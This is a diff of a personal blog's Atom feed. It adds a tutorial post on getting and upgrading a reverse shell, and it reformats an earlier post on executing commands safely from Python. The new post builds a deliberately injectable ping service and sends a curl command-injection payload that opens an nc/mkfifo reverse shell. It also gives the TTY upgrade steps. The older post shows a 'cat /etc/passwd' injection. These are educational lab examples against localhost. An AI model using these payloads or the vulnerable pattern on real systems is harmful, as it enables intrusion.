@@ -1,5 +1,150 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>supakeen</title><link href="https://supakeen.com/weblog/" rel="alternate"></link><link href="https://supakeen.com/weblog/feeds/all.atom.xml" rel="self"></link><id>https://supakeen.com/weblog/</id><updated>2018-05-25T12:00:00+02:00</updated><entry><title>Executing commands safely from Python</title><link href="https://supakeen.com/weblog/0x01.html" rel="alternate"></link><updated>2018-05-25T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2018-05-25:weblog/0x01.html</id><summary type="html">&lt;p&gt;Python provides multiple ways to execute commands on the system it is running
+<feed xmlns="http://www.w3.org/2005/Atom"><title>supakeen</title><link href="https://supakeen.com/weblog/" rel="alternate"></link><link href="https://supakeen.com/weblog/feeds/all.atom.xml" rel="self"></link><id>https://supakeen.com/weblog/</id><updated>2018-09-08T12:00:00+02:00</updated><entry><title>Upgrading a reverse shell?</title><link href="https://supakeen.com/weblog/0x02.html" rel="alternate"></link><published>2018-09-08T12:00:00+02:00</published><updated>2018-09-08T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2018-09-08:/weblog/0x02.html</id><summary type="html">&lt;p class="first last"&gt;Some notes on gaining and upgrading reverse shells.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;You've found a reverse shell but it's not behaving like a proper shell. You
+can't run &lt;cite&gt;su&lt;/cite&gt; because it requires a tty and you might not have a prompt. This
+is my quick summary on my notes on upgrading a reverse shell to something
+useful. If you want other ways (and this way is included) read the canonical
+&lt;a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"&gt;ropnop&lt;/a&gt; article as well.&lt;/p&gt;
+&lt;p&gt;Let's start with an easy and vulnerable application: a &lt;cite&gt;ping&lt;/cite&gt; API. If you've
+read my previous post you know that there is a command injection in this
+script.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Do not run scripts like these on your own machine as they are insecure.&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;tornado.web&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;tornado.ioloop&lt;/span&gt;
+
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
+
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;PingAsAService&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RequestHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_query_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;ping&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ping {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ping&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PingAsAService&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+    &lt;span class="p"&gt;])&lt;/span&gt;
+    &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ioloop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IOLoop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Using this service is pretty straightforward, passing it the &lt;cite&gt;host&lt;/cite&gt; query
+parameter will execute ping and return its output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;% python3 donotrunthis.py &amp;amp;
+[1] 11479
+% curl &amp;#39;http://localhost:8000/?host=localhost&amp;#39;
+PING localhost (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.039 ms
+
+--- localhost ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;While getting a reverse shell is slightly out of scope for this post, here is
+what I usually use. This one is from a well known &lt;a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;cheatsheet&lt;/a&gt; and works for both
+BSD and GNU nc.&lt;/p&gt;
+&lt;div class="section" id="open-three-terminals"&gt;
+&lt;h2&gt;Open three terminals.&lt;/h2&gt;
+&lt;p&gt;In one terminal where you don't run a terminal multipler setup your &lt;cite&gt;nc&lt;/cite&gt; to
+listen to a port. It is important that you don't run a terminal multiplexer such
+as &lt;cite&gt;screen&lt;/cite&gt; or &lt;cite&gt;tmux&lt;/cite&gt; because we will be adjusting the terminal settings and
+the mux will interfere.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;% nc -lv 4242
+Listening on [0.0.0.0] (family 0, port 4242)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This terminal will hang while waiting for a connection. In terminal two we'll
+run our exploitable script. Let's not run it in the background as causing tty
+input/output on a background job can cause the background process to be
+paused.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;amp; python3 donotrunthis.py
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;In the last terminal we will run our exploit. &lt;cite&gt;curl&lt;/cite&gt; has a handy option of
+escaping the URL parameters for you but you need to pass &lt;cite&gt;-G&lt;/cite&gt; to explicitly
+make the request a &lt;cite&gt;GET&lt;/cite&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -Gv --data-urlencode &amp;#39;host=localhost;rm /tmp/foo; mkfifo /tmp/foo; cat /tmp/foo | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc localhost 4242 &amp;gt; /tmp/foo &amp;amp;&amp;#39; &amp;#39;http://localhost:8000/&amp;#39;
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to localhost (127.0.0.1) port 8000 (#0)
+&amp;gt; GET /?host=localhost%3Brm%20%2Ftmp%2Ffoo%3B%20mkfifo%20%2Ftmp%2Ffoo%3B%20cat%20%2Ftmp%2Ffoo%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%20localhost%204242%20%3E%20%2Ftmp%2Ffoo%20%26 HTTP/1.1
+&amp;gt; Host: localhost:8000
+&amp;gt; User-Agent: curl/7.58.0
+&amp;gt; Accept: */*
+&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This terminal will now hang here as our exploitable application never returns
+any data. However, if we look over at our terminal with &lt;cite&gt;nc&lt;/cite&gt; in it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
+Listening on [0.0.0.0] (family 0, port 4242)
+Connection from localhost 44040 received!
+$
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Our command injection has worked and is now connected to our netcat. However
+this shell has a few issues! When we run a program and try to &lt;cite&gt;ctrl+c&lt;/cite&gt; it our
+netcat program exits. And trying to run &lt;cite&gt;su&lt;/cite&gt; yields another error:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
+Listening on [0.0.0.0] (family 0, port 4242)
+Connection from localhost 44040 received!
+$ su -
+su: must be run from a terminal
+$
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The reason of why is not relevant in this article but the gist is that your
+command injection was not allocated a &lt;cite&gt;pty&lt;/cite&gt;. We can work around that by
+first gaining a tty using python.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
+Listening on [0.0.0.0] (family 0, port 4242)
+Connection from localhost 44040 received!
+$ su -
+su: must be run from a terminal
+$ python -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;
+user@hole:~$ whoami
+whoami
+user
+user@hole:~$ su -
+su -
+Password: asdf
+
+su: Authentication failure
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Our shell gained a pty and with it a fancy prompt but everything we type is being
+output and sadly using &lt;cite&gt;ctrl+c&lt;/cite&gt; still exits our nc. Not the process on the
+remote.&lt;/p&gt;
+&lt;p&gt;To fix this we're going to tell our own terminal to not interpret any command
+sequences anymore.&lt;/p&gt;
+&lt;p&gt;First we &lt;cite&gt;ctrl+z&lt;/cite&gt; which moves the current &lt;cite&gt;nc&lt;/cite&gt; to the background. We then put
+our own terminal in raw mode using &lt;cite&gt;stty raw -echo&lt;/cite&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
+Listening on [0.0.0.0] (family 0, port 4242)
+Connection from localhost 44040 received!
+$ su -
+su: must be run from a terminal
+$ python -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;
+user@hole:~$ whoami
+whoami
+user
+user@hole:~$ su -
+su -
+Password: asdf
+
+su: Authentication failure
+
+user@hole:~$ ^Z
+[1]+  Stopped                 nc -lv 4242
+$ stty raw -echo
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;After you enter this you will see nothing and your own keypresses won't be
+shown anymore. Enter &lt;cite&gt;fg&lt;/cite&gt; blindly to resume the netcat process after which
+you will see output again as the pty you spawned earlier is now talking to your
+terminal. This means the double output for keys is gone. For good measure
+&lt;cite&gt;reset&lt;/cite&gt; straight after the &lt;cite&gt;fg&lt;/cite&gt; and let's see if everything is as it should
+be.&lt;/p&gt;
+&lt;p&gt;This will clear the and possibly resize it for you. You now have a fully
+functional reverse shell. You can run tmux or screen, or any other application
+your heart desires.&lt;/p&gt;
+&lt;/div&gt;
+</content><category term="shell"></category><category term="tty"></category></entry><entry><title>Executing commands safely from Python</title><link href="https://supakeen.com/weblog/0x01.html" rel="alternate"></link><published>2018-05-25T12:00:00+02:00</published><updated>2018-05-25T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2018-05-25:/weblog/0x01.html</id><summary type="html">&lt;p class="first last"&gt;A introduction on how to use Python to execute subcommands safely.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;Python provides multiple ways to execute commands on the system it is running
 on. Some of them inherently unsafe, some of them safe in nature but easy to
 use in an unsafe way.&lt;/p&gt;
 &lt;p&gt;Here I will set out to document the current ways to execute commands with
@@ -18,7 +163,7 @@ page. I will provide my own here.&lt;/p&gt;
 the argument it receives. I name this program &lt;cite&gt;service.py&lt;/cite&gt; and its goal is
 to restart services. To do that it uses a function to execute commands called
 &lt;a class="reference external" href="https://docs.python.org/3/library/os.html#os.system"&gt;os.system&lt;/a&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
 
 &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;systemctl restart {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
@@ -27,7 +172,7 @@ to restart services. To do that it uses a function to execute commands called
 into our &lt;cite&gt;os.system&lt;/cite&gt;-call will be the string &lt;cite&gt;systemctl restart nginx&lt;/cite&gt; and all
 is good in the world. However, if someone calls our program as
 &lt;cite&gt;python service.py 'nginx;cat /etc/passwd'&lt;/cite&gt; our executed command will become:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;systemctl restart nginx&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;systemctl restart nginx&lt;span class="p"&gt;;&lt;/span&gt;
 cat /etc/passwd
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Where I have added the newline myself for clarity. Our program was not intended to
@@ -89,7 +234,7 @@ being exploited.&lt;/p&gt;
 its own flaws that allow it to be subverted to do things you don't want.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Let's make a version of our previous program using subprocess. Subprocess offers
 many functions but they all follow the same rules for their arguments:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
 
 &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;systemctl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;restart&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
@@ -102,7 +247,7 @@ the arguments will each be passed as a separate argument.&lt;/p&gt;
 &lt;p&gt;This means arguments are not interpreted by a shell first and this makes it impossible
 for someone to execute other commands through the shell.&lt;/p&gt;
 &lt;p&gt;If you pass a single string to subprocess such as:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
 
 &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;systemctl restart nginx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -118,7 +263,7 @@ arguments to your executable.&lt;/p&gt;
 can be set to &lt;cite&gt;True&lt;/cite&gt;. If you do so then you can only pass a string which will
 be passed the same way, as &lt;cite&gt;sh -c 'command'&lt;/cite&gt;, if you do pass a list then it will
 be passed as:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;execve(&amp;quot;/bin/sh&amp;quot;, [&amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;systemctl&amp;quot;, &amp;quot;restart&amp;quot;, &amp;quot;nginx&amp;quot;], ...
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;execve(&amp;quot;/bin/sh&amp;quot;, [&amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;systemctl&amp;quot;, &amp;quot;restart&amp;quot;, &amp;quot;nginx&amp;quot;], ...
 &lt;/pre&gt;&lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
@@ -143,4 +288,4 @@ rules for shells. Specifically you could try to use &lt;cite&gt;shlex.quote&lt;/
 you fill in. Reasoning about what is 'safe' or 'unsafe' becomes very difficult in
 this context.&lt;/p&gt;
 &lt;/div&gt;
-</summary><category term="python"></category><category term="subprocess"></category></entry></feed>
+</content><category term="python"></category><category term="subprocess"></category></entry></feed>
